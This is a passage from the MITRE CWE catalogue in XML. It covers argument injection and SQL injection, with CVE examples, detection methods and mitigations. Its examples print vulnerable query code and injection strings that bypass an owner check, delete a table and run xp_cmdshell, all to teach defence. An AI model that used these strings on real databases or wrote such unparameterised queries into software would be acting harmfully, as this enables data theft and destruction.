            <Observed_Example>
               <Reference>CVE-2004-0489</Reference>
               <Description>SSH URI handler for web browser allows remote attackers to execute arbitrary code or conduct port forwarding via the a command line option.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0489</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0411</Reference>
               <Description>Web browser doesn't filter "-" when invoking various commands, allowing command-line switches to be specified.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0411</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4699</Reference>
               <Description>Argument injection vulnerability in TellMe 1.2 and earlier allows remote attackers to modify command line arguments for the Whois program and obtain sensitive information via "--" style options in the q_Host parameter.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4699</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-1865</Reference>
               <Description>Beagle before 0.2.5 can produce certain insecure command lines to launch external helper applications while indexing, which allows attackers to execute arbitrary commands. NOTE: it is not immediately clear whether this issue involves argument injection, shell metacharacters, or other issues.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1865</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2056</Reference>
               <Description>Argument injection vulnerability in Internet Explorer 6 for Windows XP SP2 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2056</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2057</Reference>
               <Description>Argument injection vulnerability in Mozilla Firefox 1.0.6 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2057</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2058</Reference>
               <Description>Argument injection vulnerability in Avant Browser 10.1 Build 17 allows user-assisted remote attackers to modify command line arguments to an invoked mail client via " (double quote) characters in a mailto: scheme handler, as demonstrated by launching Microsoft Outlook with an arbitrary filename as an attachment. NOTE: it is not clear whether this issue is implementation-specific or a problem in the Microsoft API.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2312</Reference>
               <Description>Argument injection vulnerability in the URI handler in Skype 2.0.*.104 and 2.5.*.0 through 2.5.*.78 for Windows allows remote authorized attackers to download arbitrary files via a URL that contains certain command-line switches.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2312</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3015</Reference>
               <Description>Argument injection vulnerability in WinSCP 3.8.1 build 328 allows remote attackers to upload or download arbitrary files via encoded spaces and double-quote characters in a scp or sftp URI.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3015</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4692</Reference>
               <Description>Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a "/" (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka "Object Packager Dialogue Spoofing Vulnerability."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4692</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6597</Reference>
               <Description>Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-0882</Reference>
               <Description>Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client "-f" sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0882</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1246</Reference>
               <Description>Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1246</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>System Process</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Argument Injection or Modification</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV03-C</Entry_ID>
               <Entry_Name>Sanitize the environment when invoking external programs</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV33-C</Entry_ID>
               <Entry_Name>Do not call system()</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR02-C</Entry_ID>
               <Entry_Name>Sanitize data passed to complex subsystems</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>30</Entry_ID>
               <Entry_Name>Mail Command Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="137"/>
            <Related_Attack_Pattern CAPEC_ID="174"/>
            <Related_Attack_Pattern CAPEC_ID="41"/>
            <Related_Attack_Pattern CAPEC_ID="460"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-859"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 10, &#34;The Argument Array&#34;, Page 567"/>
         </References>
         <Notes>
            <Note Type="Relationship">At one layer of abstraction, this can overlap other weaknesses that have whitespace problems, e.g. injection of javascript into attributes of HTML tags.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="89" Name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</xhtml:p>
            <xhtml:p>SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or software package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Database Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness typically appears in data-rich applications that save user inputs in a database.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method>Manual Analysis</Method>
               <Description>Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using "exec" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>
                  <xhtml:p>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</xhtml:p>
                  <xhtml:p>Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</xhtml:p>
                  <xhtml:p>Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing SQL query strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name "O'Reilly" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.</xhtml:p>
                  <xhtml:p>When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.</xhtml:p>
                  <xhtml:p>If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.</xhtml:p>
                  <xhtml:p>In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>string userName = ctx.getAuthenticatedUserName();<xhtml:br/>string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>DataTable dt = new DataTable();<xhtml:br/>sda.Fill(dt);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The query that this code intends to execute follows:</Body_Text>
               <Example_Code Nature="informative">
                  <xhtml:div>SELECT * FROM items WHERE owner = &lt;userName&gt; AND itemname = &lt;itemName&gt;;</xhtml:div>
               </Example_Code>
               <Body_Text>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name' OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>The addition of the:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items;</xhtml:div>
               </Example_Code>
               <Body_Text>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.</Intro_Text>
               <Body_Text>If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name'; DELETE FROM items; --</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following two queries:</Body_Text>
               <Example_Code Nature="attack" Language="SQL">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>
                     <xhtml:i>--'</xhtml:i>
                     <xhtml:br/>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.</Body_Text>
               <Body_Text>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.</Body_Text>
               <Body_Text>If an attacker enters the string</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>Then the following three valid statements will be created:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>SELECT * FROM items WHERE 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>Target fields that are not quoted</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Find ways to bypass the need for certain escaped meta-characters</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Use stored procedures to hide the injected meta-characters.</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
               <Body_Text>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.</Body_Text>
               <Body_Text>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.</Body_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)<xhtml:br/>is open itm_cv for<xhtml:br/>' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';<xhtml:br/>end get_item;</xhtml:div>
               </Example_Code>
               <Body_Text>Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:</Intro_Text>
               <Example_Code Nature="bad">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Where $user_input is taken from an untrusted source.</Body_Text>
               <Body_Text>If the user provides the string:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>'; exec master..xp_cmdshell 'dir' --</xhtml:div>
               </Example_Code>
               <Body_Text>The query will take the following form:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Now, this query can be broken down into:</Body_Text>
               <Body_Text>
                  <xhtml:ol>
                     <xhtml:li>
                        <xhtml:div>a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>an MS SQL comment: --' ORDER BY PRICE</xhtml:div>
                     </xhtml:li>
                  </xhtml:ol>
               </Body_Text>
               <Body_Text>As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code intends to print a message summary given the message ID.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$id = $_COOKIE["mid"];<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.</Body_Text>
               <Body_Text>While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:</Body_Text>
               <Example_Code Nature="attack">
